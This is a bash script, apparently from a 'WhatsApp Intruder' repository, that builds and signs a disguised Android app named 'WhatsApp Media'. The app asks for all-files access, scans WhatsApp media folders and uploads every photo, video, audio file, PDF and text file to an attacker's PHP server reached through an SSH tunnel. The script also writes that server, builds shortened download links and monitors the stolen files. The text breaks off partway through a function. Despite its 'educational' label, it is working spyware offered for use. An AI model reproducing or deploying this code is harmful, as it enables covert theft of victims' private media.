#!/bin/bash
# WhatsApp Intruder - Educational Purpose Only
# Repository: https://github.com/zr0n/whatsintruder  
# Author: https://github.com/zr0n

host="159.89.214.31" #Serveo.net

trap 'printf "\n";stop' 2

stop() {
    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checksh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

dependencies() {
    command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it. Aborting."; exit 1; }
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
}

banner() {
    printf "\e[1;77m__      ___         _      ___     _               _         \n"
    printf " \ \    / / |_  __ _| |_ __|_ _|_ _| |_ _ _ _  _ __| |___ _ _ \n"
    printf "  \ \/\/ /| ' \/ _\` |  _(_-<| || ' \  _| '_| || / _\` / -_) '_|\n"
    printf "   \_/\_/ |_||_\__,_|\__/__/___|_||_\__|_|  \_,_\__,_\___|_|  \n"
    printf "\n"
    printf "     \e[1;92mAuthor: https://github.com/zr0n\n\e[0m"
    printf "     \e[1;92mRepository: https://github.com/zr0n/whatsintruder\n\e[0m"
    printf "\n"
}

create_gradle_files() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Creating Gradle build files...\e[0m\n"

    # Create directory structure
    mkdir -p app/gradle/wrapper
    mkdir -p app/app/src/main/java/com/whatsapphack/
    mkdir -p app/app/src/main/res/values/
    mkdir -p app/app/src/main/res/layout/
    mkdir -p app/app/src/main/res/drawable/

    # Create gradle-wrapper.properties with correct Gradle 7.5.1
    cat > app/gradle/wrapper/gradle-wrapper.properties << 'EOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.5.1-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF

    # Create the official gradlew script
    cat > app/gradlew << 'EOF'
#!/usr/bin/env sh

#
# Copyright 2015 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

##############################################################################
##
##  Gradle start up script for UN*X
##
##############################################################################

# Attempt to set APP_HOME
# Resolve links: $0 may be a link
PRG="$0"
# Need this for relative symlinks.
while [ -h "$PRG" ] ; do
    ls=`ls -ld "$PRG"`
    link=`expr "$ls" : '.*-> \(.*\)$'`
    if expr "$link" : '/.*' > /dev/null; then
        PRG="$link"
    else
        PRG=`dirname "$PRG"`"/$link"
    fi
done
SAVED="`pwd`"
cd "`dirname \"$PRG\"`/" >/dev/null
APP_HOME="`pwd -P`"
cd "$SAVED" >/dev/null

APP_NAME="Gradle"
APP_BASE_NAME=`basename "$0"`

# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'

# Use the maximum available, or set MAX_FD != -1 to use that value.
MAX_FD="maximum"

warn () {
    echo "$*"
}

die () {
    echo
    echo "$*"
    echo
    exit 1
}

# OS specific support (must be 'true' or 'false').
cygwin=false
msys=false
darwin=false
nonstop=false
case "`uname`" in
  CYGWIN* )
    cygwin=true
    ;;
  Darwin* )
    darwin=true
    ;;
  MINGW* )
    msys=true
    ;;
  NONSTOP* )
    nonstop=true
    ;;
esac

CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar

# Determine the Java command to use to start the JVM.
if [ -n "$JAVA_HOME" ] ; then
    if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
        # IBM's JDK on AIX uses strange locations for the executables
        JAVACMD="$JAVA_HOME/jre/sh/java"
    else
        JAVACMD="$JAVA_HOME/bin/java"
    fi
    if [ ! -x "$JAVACMD" ] ; then
        die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
else
    JAVACMD="java"
    which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
fi

# Increase the maximum file descriptors if we can.
if [ "$cygwin" = "false" ] && [ "$darwin" = "false" ] && [ "$nonstop" = "false" ] ; then
    MAX_FD_LIMIT=`ulimit -H -n`
    if [ $? -eq 0 ] ; then
        if [ "$MAX_FD" = "maximum" ] || [ "$MAX_FD" = "max" ] ; then
            MAX_FD="$MAX_FD_LIMIT"
        fi
        ulimit -n $MAX_FD
        if [ $? -ne 0 ] ; then
            warn "Could not set maximum file descriptor limit: $MAX_FD"
        fi
    else
        warn "Could not query maximum file descriptor limit: $MAX_FD_LIMIT"
    fi
fi

# For Darwin, add options to specify how the application appears in the dock
if $darwin; then
    GRADLE_OPTS="$GRADLE_OPTS \"-Xdock:name=$APP_NAME\" \"-Xdock:icon=$APP_HOME/media/gradle.icns\""
fi

# For Cygwin or MSYS, switch paths to Windows format before running java
if [ "$cygwin" = "true" ] || [ "$msys" = "true" ] ; then
    APP_HOME=`cygpath --path --mixed "$APP_HOME"`
    CLASSPATH=`cygpath --path --mixed "$CLASSPATH"`
    JAVACMD=`cygpath --unix "$JAVACMD"`

    # We build the pattern for arguments to be converted via cygpath
    ROOTDIRSRAW=`find -L / -maxdepth 1 -mindepth 1 -type d 2>/dev/null`
    SEP=""
    for dir in $ROOTDIRSRAW ; do
        ROOTDIRS="$ROOTDIRS$SEP$dir"
        SEP="|"
    done
    OURCYGPATTERN="(^($ROOTDIRS))"
    # Now convert the arguments - kludge to limit ourselves to /bin/sh
    i=0
    for arg in "$@" ; do
        CHECK=`echo "$arg"|egrep -c "$OURCYGPATTERN" -`
        CHECK2=`echo "$arg"|egrep -c "^-"`                                 ### Determine if an option

        if [ $CHECK -ne 0 ] && [ $CHECK2 -eq 0 ] ; then                    ### Added a condition
            eval `echo args$i`=`cygpath --path --ignore --mixed "$arg"`
        else
            eval `echo args$i`="\"$arg\""
        fi
        i=$((i+1))
    done
    case $i in
        (0) set -- ;;
        (1) set -- "$args0" ;;
        (2) set -- "$args0" "$args1" ;;
        (3) set -- "$args0" "$args1" "$args2" ;;
        (4) set -- "$args0" "$args1" "$args2" "$args3" ;;
        (5) set -- "$args0" "$args1" "$args2" "$args3" "$args4" ;;
        (6) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" ;;
        (7) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" "$args6" ;;
        (8) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" "$args6" "$args7" ;;
        (9) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" "$args6" "$args7" "$args8" ;;
    esac
fi

# Escape application args
save () {
    for i do printf %s\\n "$i" | sed "s/'/'\\\\''/g;1s/^/'/;\$s/\$/' \\\\/" ; done
    echo " "
}
APP_ARGS=$(save "$@")

# Collect all arguments for the java command, following the shell quoting and substitution rules
eval set -- $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS "\"-Dorg.gradle.appname=$APP_BASE_NAME\"" -classpath "\"$CLASSPATH\"" org.gradle.wrapper.GradleWrapperMain "$APP_ARGS"

# by default we should be in the project directory
[ "$(pwd)" != "$APP_HOME" ] && cd "$APP_HOME"

exec "$JAVACMD" "$@"
EOF

    chmod +x app/gradlew

    # Download the correct gradle-wrapper.jar for Gradle 7.5.1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Downloading gradle-wrapper.jar...\e[0m\n"
    curl -L -o app/gradle/wrapper/gradle-wrapper.jar "https://github.com/gradle/gradle/raw/v7.5.1/gradle/wrapper/gradle-wrapper.jar"

    # Create root build.gradle with updated versions
cat > app/build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:7.4.2'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF

    # Create app module build.gradle with optimized configuration
    cat > app/app/build.gradle << 'EOF'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.whatsapphack'
    compileSdk 33

    defaultConfig {
        applicationId "com.whatsapphack"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    
    // Otimizações para evitar StackOverflow
    dexOptions {
        javaMaxHeapSize "4g"
        preDexLibraries true
        maxProcessCount 8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.8.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
EOF

    # Create settings.gradle
    cat > app/settings.gradle << 'EOF'
rootProject.name = "WhatsAppHack"
include ':app'
EOF

    # Create AndroidManifest.xml
    cat > app/app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.whatsapphack">

    <!-- Permissões para Android 10+ -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    
    <!-- Para Android 11+ -->
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:usesCleartextTraffic="true"
        tools:targetApi="30">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

    # Create strings.xml
    cat > app/app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">WhatsApp Media</string>
</resources>
EOF

    # Create layout
    cat > app/app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:padding="16dp">

    <TextView
        android:id="@+id/status_text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Inicializando..."
        android:textSize="18sp"
        android:textStyle="bold" />

    <ProgressBar
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="16dp"
        android:indeterminate="true" />

</LinearLayout>
EOF

    # Create colors.xml
    cat > app/app/src/main/res/values/colors.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="ic_launcher_background">#FFFFFF</color>
</resources>
EOF

    # Create simple launcher icon
    cat > app/app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="108dp"
    android:height="108dp"
    android:viewportWidth="108"
    android:viewportHeight="108">
    <path
        android:fillColor="#3DDC84"
        android:pathData="M0,0h108v108h-108z"/>
</vector>
EOF

    # Create proguard rules
    cat > app/app/proguard-rules.pro << 'EOF'
-keep class com.whatsapphack.** { *; }
-dontwarn org.apache.commons.**
EOF

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Gradle files created successfully!\e[0m\n"
}

createapp() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Creating app source code...\e[0m\n"
    
    if [[ ! -d app/app/src/main/java/com/whatsapphack/ ]]; then
        mkdir -p app/app/src/main/java/com/whatsapphack/
    fi

    cat > app/app/src/main/java/com/whatsapphack/MainActivity.java << 'EOF'
    package com.whatsapphack;

import android.content.pm.PackageManager;
import android.app.Activity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.annotation.SuppressLint;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;
import android.content.Intent;
import android.os.Environment;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class MainActivity extends Activity {
    private static final String TAG = "WhatsAppHack";
    private static final int STORAGE_PERMISSION_CODE = 123;
    private ExecutorService executor;
    private Handler mainHandler;
    
    // URLs - serão substituídas automaticamente pelo script
    private static final String UPLOAD_SERVER = "http://SERVER_URL_PLACEHOLDER/upload_files.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        TextView statusText = findViewById(R.id.status_text);
        statusText.setText("WhatsApp Intruder\nLoading Tools (it can take several minutes)...");
        
        executor = Executors.newSingleThreadExecutor();
        mainHandler = new Handler(Looper.getMainLooper());
        
        Log.d(TAG, "Activity created - Upload Server: " + UPLOAD_SERVER);
        
        // Request permissions
        checkPermissions();
    }

    private void checkPermissions() {
        if (hasStoragePermission()) {
            Log.d(TAG, "Permissions granted, starting file processing");
            startFileProcessing();
        } else {
            Log.d(TAG, "Requesting storage permissions");
            requestStoragePermissions();
        }
    }

    private boolean hasStoragePermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        } else {
            return ContextCompat.checkSelfPermission(this, 
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestStoragePermissions() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, STORAGE_PERMISSION_CODE);
            } catch (Exception e) {
                Log.e(TAG, "Error requesting storage permission", e);
                // Try alternative method
                Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, STORAGE_PERMISSION_CODE);
            }
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            android.Manifest.permission.READ_EXTERNAL_STORAGE,
                            android.Manifest.permission.WRITE_EXTERNAL_STORAGE
                    },
                    STORAGE_PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Permissions granted via request");
                startFileProcessing();
            } else {
                Log.w(TAG, "Permissions denied");
                showToast("Storage permissions denied - limited functionality");
                // Try anyway with available permissions
                startFileProcessing();
            }
        }
    }

    private void startFileProcessing() {
        updateStatus("WhatsApp Media Scanner\nScanning directories...");
        
        executor.execute(() -> {
            try {
                List<File> allMediaFiles = new ArrayList<>();
                String[] possiblePaths = {
                    "/storage/emulated/0/WhatsApp/Media",
                    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media", 
                    "/storage/emulated/0/Pictures/WhatsApp",
                    "/storage/emulated/0/WhatsApp/WhatsApp Media",
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES) + "/WhatsApp",
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM) + "/WhatsApp",
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/WhatsApp",
                    "/sdcard/WhatsApp/Media",
                    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media"
                };

                StringBuilder foundDirs = new StringBuilder("WhatsApp Scanner 2025\n\nFound directories:\n");
                int totalFiles = 0;
                
                for (String path : possiblePaths) {
                    File dir = new File(path);
                    if (dir.exists() && dir.isDirectory()) {
                        List<File> filesInDir = scanDirectoryForFiles(dir);
                        foundDirs.append("✓ ").append(path).append(" (").append(filesInDir.size()).append(" files)\n");
                        allMediaFiles.addAll(filesInDir);
                        totalFiles += filesInDir.size();
                        Log.d(TAG, "Found " + filesInDir.size() + " files in: " + path);
                    }
                }
                
                final int finalTotalFiles = totalFiles;
                final String finalFoundDirs = foundDirs.toString();
                
                if (totalFiles > 0) {
                    mainHandler.post(() -> {
                        updateStatus(finalFoundDirs + "\n\nFound " + finalTotalFiles + " files\nStarting REAL upload...");
                        showToast("Found " + finalTotalFiles + " files - Starting upload");
                    });
                    
                    // Pequeno delay antes do upload
                    mainHandler.postDelayed(() -> {
                        startRealUploadProcess(allMediaFiles, finalFoundDirs);
                    }, 2000);
                } else {
                    mainHandler.post(() -> {
                        updateStatus("WhatsApp Media Scanner 2025\n\nNo media found in standard locations.");
                        showToast("No media files found");
                        finishAfterDelay();
                    });
                }
            } catch (Exception e) {
                Log.e(TAG, "Error processing files", e);
                mainHandler.post(() -> {
                    updateStatus("Error scanning files\n" + e.getMessage());
                    showToast("Scan failed");
                    finishAfterDelay();
                });
            }
        });
    }

    private List<File> scanDirectoryForFiles(File directory) {
        List<File> filesList = new ArrayList<>();
        try {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        filesList.addAll(scanDirectoryForFiles(file));
                    } else {
                        if (isMediaFile(file)) {
                            filesList.add(file);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning: " + directory.getAbsolutePath(), e);
        }
        return filesList;
    }

    private void startRealUploadProcess(List<File> files, String foundDirs) {
        final int totalFiles = files.size();
        final AtomicInteger uploadedCount = new AtomicInteger(0);
        final AtomicInteger successCount = new AtomicInteger(0);
        
        // Usar executor separado para uploads
        ExecutorService uploadExecutor = Executors.newFixedThreadPool(3); // Aumentado para 3 threads
        
        mainHandler.post(() -> {
            updateStatus(foundDirs + "\n\nREAL UPLOAD STARTED\nFiles: " + totalFiles + "\nProgress: 0/" + totalFiles + "\nServer: " + UPLOAD_SERVER);
        });

        for (int i = 0; i < files.size(); i++) {
            final File file = files.get(i);
            final int fileNumber = i + 1;
            
            uploadExecutor.execute(() -> {
                boolean success = realUploadFile(file);
                int currentUploaded = uploadedCount.incrementAndGet();
                
                if (success) {
                    successCount.incrementAndGet();
                }
                
                final int currentSuccess = successCount.get();
                final String status = success ? "✓ UPLOADED" : "✗ FAILED";
                
                mainHandler.post(() -> {
                    updateStatus(foundDirs + 
                               "\n\nREAL UPLOAD IN PROGRESS\n" +
                               "Progress: " + currentUploaded + "/" + totalFiles + "\n" +
                               "Successful: " + currentSuccess + "\n" +
                               "Current: " + status + " - " + file.getName());
                });
                
                Log.d(TAG, status + " - " + file.getName());
                
                // Último arquivo - finalizar
                if (currentUploaded == totalFiles) {
                    mainHandler.post(() -> {
                        String result = foundDirs + 
                                      "\n\nUPLOAD COMPLETE\n" +
                                      "Total files: " + totalFiles + "\n" +
                                      "Successfully uploaded: " + currentSuccess + "\n" +
                                      "Failed: " + (totalFiles - currentSuccess) + "\n" +
                                      "Upload Server: " + UPLOAD_SERVER;
                        updateStatus(result);
                        showToast("Upload complete! " + currentSuccess + "/" + totalFiles + " files");
                        finishAfterDelay();
                    });
                    uploadExecutor.shutdown();
                }
            });
            
            // Delay menor entre uploads para ser mais rápido
            try {
                Thread.sleep(300); // 300ms entre uploads
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }

    private boolean realUploadFile(File file) {
        try {
            Log.d(TAG, "REAL UPLOAD START: " + file.getAbsolutePath() + " (" + file.length() + " bytes)");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL(UPLOAD_SERVER);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            connection.setConnectTimeout(30000); // 30 segundos
            connection.setReadTimeout(30000); // 30 segundos

            OutputStream outputStream = connection.getOutputStream();
            
            // Write file data
            outputStream.write((twoHyphens + boundary + lineEnd).getBytes());
            outputStream.write(("Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            outputStream.write(("Content-Type: application/octet-stream" + lineEnd).getBytes());
            outputStream.write((lineEnd).getBytes());

            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int bytesRead;
            int totalBytes = 0;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            
            fileInputStream.close();
            outputStream.write((lineEnd).getBytes());
            outputStream.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();
            String responseMessage = connection.getResponseMessage();
            
            Log.d(TAG, "UPLOAD RESPONSE: " + responseCode + " - " + responseMessage + " - " + file.getName() + " (" + totalBytes + " bytes)");
            
            boolean success = responseCode == HttpURLConnection.HTTP_OK;
            
            if (success) {
                Log.d(TAG, "✅ UPLOAD SUCCESS: " + file.getName());
            } else {
                Log.e(TAG, "❌ UPLOAD FAILED: " + file.getName() + " - Code: " + responseCode);
            }
            
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ UPLOAD ERROR: " + file.getName() + " - " + e.getMessage());
            return false;
        }
    }

    private boolean isMediaFile(File file) {
        String name = file.getName().toLowerCase();
        return name.endsWith(".jpg") || name.endsWith(".jpeg") || 
               name.endsWith(".png") || name.endsWith(".mp4") || 
               name.endsWith(".3gp") || name.endsWith(".ogg") ||
               name.endsWith(".gif") || name.endsWith(".webp") ||
               name.endsWith(".m4a") || name.endsWith(".pdf") ||
               name.endsWith(".txt");
    }

    private void updateStatus(final String message) {
        mainHandler.post(() -> {
            //TextView statusText = findViewById(R.id.status_text);
            //if (statusText != null) {
            //    statusText.setText(message);
            //}
            Log.d(TAG, message);
        });
    }

    private void showToast(final String message) {
        mainHandler.post(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
    }

    private void finishAfterDelay() {
        mainHandler.postDelayed(() -> {
            showToast("Closing app...");
            finish();
        }, 10000); // 10 segundos para ver o resultado
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null) {
            executor.shutdown();
        }
        Log.d(TAG, "Activity destroyed");
    }
}
EOF
}

configureapp() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"
    create_gradle_files
    createapp
    create_launcher_icons
}

# Função melhorada para monitorar uploads
# Função para monitorar uploads em tempo real
checkimg() {
    printf "\n"
    printf "\e[1;92m[*] Starting upload monitor...\e[0m\n"
    printf "\e[1;92m[*] Monitoring tunnel and uploads...\e[0m\n"
    printf "\e[1;92m[*] Press Ctrl + C to exit...\e[0m\n"
    
    # Mostrar informações do túnel
    if [ -f tunnel_url.txt ]; then
        tunnel_url=$(cat tunnel_url.txt)
        printf "\e[1;92m[*] Active tunnel: %s\e[0m\n" "$tunnel_url"
    fi
    
    # Monitorar em loop
    while true; do
        # Verificar se o túnel ainda está ativo
        if [ -f serveo_debug.log ]; then
            if ! pgrep -f "serveo.net" > /dev/null; then
                printf "\e[1;91m[!] Serveo tunnel disconnected!\e[0m\n"
            fi
        fi
        
        if [ -f localhost_debug.log ]; then
            if ! pgrep -f "localhost.run" > /dev/null; then
                printf "\e[1;91m[!] Localhost.run tunnel disconnected!\e[0m\n"
            fi
        fi
        
        # Monitorar uploads
        if [ -f debug.log ]; then
            local new_uploads=$(tail -n 5 debug.log | grep -E "(UPLOAD|FILE|REQUEST)" | tail -1)
            if [ -n "$new_uploads" ]; then
                printf "\e[1;93m[DEBUG] %s\e[0m\n" "$new_uploads"
            fi
        fi
        
        if [ -f upload.log ]; then
            local upload_count=$(wc -l < upload.log 2>/dev/null || echo 0)
            local new_upload=$(tail -1 upload.log 2>/dev/null)
            if [ -n "$new_upload" ]; then
                printf "\e[1;92m[UPLOAD] %s\e[0m\n" "$new_upload"
                printf "\e[1;92m[*] Total uploads: %d\e[0m\n" "$upload_count"
            fi
        fi
        
        # Verificar arquivos
        if [ -d uploadedfiles/ ]; then
            local file_count=$(ls -1 uploadedfiles/ 2>/dev/null | wc -l)
            if [ "$file_count" -gt 0 ]; then
                printf "\e[1;92m[*] Files in uploadedfiles/: %d\e[0m\n" "$file_count"
            fi
        fi
        
        sleep 5
    done
}
# Função para criar o arquivo PHP de upload
create_upload_php() {
    cat > upload_files.php << 'EOF'
<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadDir = 'uploadedfiles/';
    
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    
    if (isset($_FILES['uploadedfile'])) {
        $file = $_FILES['uploadedfile'];
        $fileName = basename($file['name']);
        $filePath = $uploadDir . $fileName;
        
        // Adicionar timestamp para evitar sobrescrever arquivos
        $fileInfo = pathinfo($fileName);
        $timestamp = time();
        $newFileName = $fileInfo['filename'] . '_' . $timestamp . '.' . $fileInfo['extension'];
        $filePath = $uploadDir . $newFileName;
        
        if (move_uploaded_file($file['tmp_name'], $filePath)) {
            file_put_contents('Log.log', "File uploaded: " . $newFileName . "\n", FILE_APPEND);
            echo "File uploaded successfully: " . $newFileName;
        } else {
            http_response_code(500);
            echo "Error uploading file";
        }
    } else {
        http_response_code(400);
        echo "No file uploaded";
    }
} else {
    http_response_code(405);
    echo "Method not allowed";
}
?>
EOF
    printf "\e[1;92m[*] Upload PHP script created\e[0m\n"
}

# Função para atualizar a URL no código Java
update_app_url() {
    local url="$1"
    printf "\e[1;92m[*] Updating app with server URL: %s\e[0m\n" "$url"
    
    # Fazer backup
    cp app/app/src/main/java/com/whatsapphack/MainActivity.java app/app/src/main/java/com/whatsapphack/MainActivity.java.backup
    
    # Primeiro restaurar o original se existir
    if [ -f app/app/src/main/java/com/whatsapphack/MainActivity.java.original ]; then
        cp app/app/src/main/java/com/whatsapphack/MainActivity.java.original app/app/src/main/java/com/whatsapphack/MainActivity.java
    else
        # Salvar como original na primeira vez
        cp app/app/src/main/java/com/whatsapphack/MainActivity.java app/app/src/main/java/com/whatsapphack/MainActivity.java.original
    fi
    
    # Substituir o placeholder
    sed -i "s|http://SERVER_URL_PLACEHOLDER|${url}|g" app/app/src/main/java/com/whatsapphack/MainActivity.java
    
    # Verificar se funcionou
    if grep -q "$url" app/app/src/main/java/com/whatsapphack/MainActivity.java; then
        printf "\e[1;92m[✓] App updated with URL: %s\e[0m\n" "$url"
        return 0
    else
        printf "\e[1;91m[!] Failed to update app URL!\e[0m\n"
        # Restaurar backup
        cp app/app/src/main/java/com/whatsapphack/MainActivity.java.backup app/app/src/main/java/com/whatsapphack/MainActivity.java
        return 1
    fi
}

# Função para rebuild do APK com a URL correta
rebuild_app() {
    printf "\e[1;92m[*] Rebuilding APK with correct server URL...\e[0m\n"
    
    cd app/
    
    # Clean and build
    ./gradlew clean > /dev/null 2>&1
    ./gradlew :app:assembleRelease \
        --no-daemon \
        --configure-on-demand \
        --parallel \
        -Dorg.gradle.jvmargs="-Xmx2g -Xss512k -Dfile.encoding=UTF-8" \
        -Dorg.gradle.parallel=true \
        -Dorg.gradle.daemon=false
    
    cd ..
    
    # Sign APK
    if [[ -e app/app/build/outputs/apk/release/app-release-unsigned.apk ]]; then
        cp app/app/build/outputs/apk/release/app-release-unsigned.apk app.apk
        apksigner sign --ks key.keystore --ks-pass pass:android app.apk > /dev/null 2>&1
        printf "\e[1;92m[*] APK rebuilt and signed successfully\e[0m\n"
    else
        printf "\e[1;91m[!] APK rebuild failed\e[0m\n"
    fi
}
create_manual_tinyurl() {
    local url="$1"
    printf "\e[1;92m[*] Trying TinyURL alternative method...\e[0m\n"
    
    # Try is.gd as a fallback
    local fallback_url=$(curl -s --max-time 10 "https://is.gd/create.php?format=simple&url=$url")
    if [[ "$fallback_url" == https://* ]]; then
        printf '\e[1;93m[*] Fallback Short URL:\e[0m\e[1;77m %s \n' "$fallback_url"
        echo "Fallback Short URL: $fallback_url" >> generated_urls.txt
    else
        printf '\e[1;91m[!] All URL shortening services failed.\e[0m\n'
        printf '\e[1;92m[!] Please use the direct localhost.run URL manually.\e[0m\n'
    fi
}

create_serveo_tinyurl() {
    local url="$1"
    local full_url="${url}/app.apk"
    
    printf "\e[1;92m[*] Creating short URL for Serveo...\e[0m\n"
    
    # Tentar múltiplos serviços de encurtamento
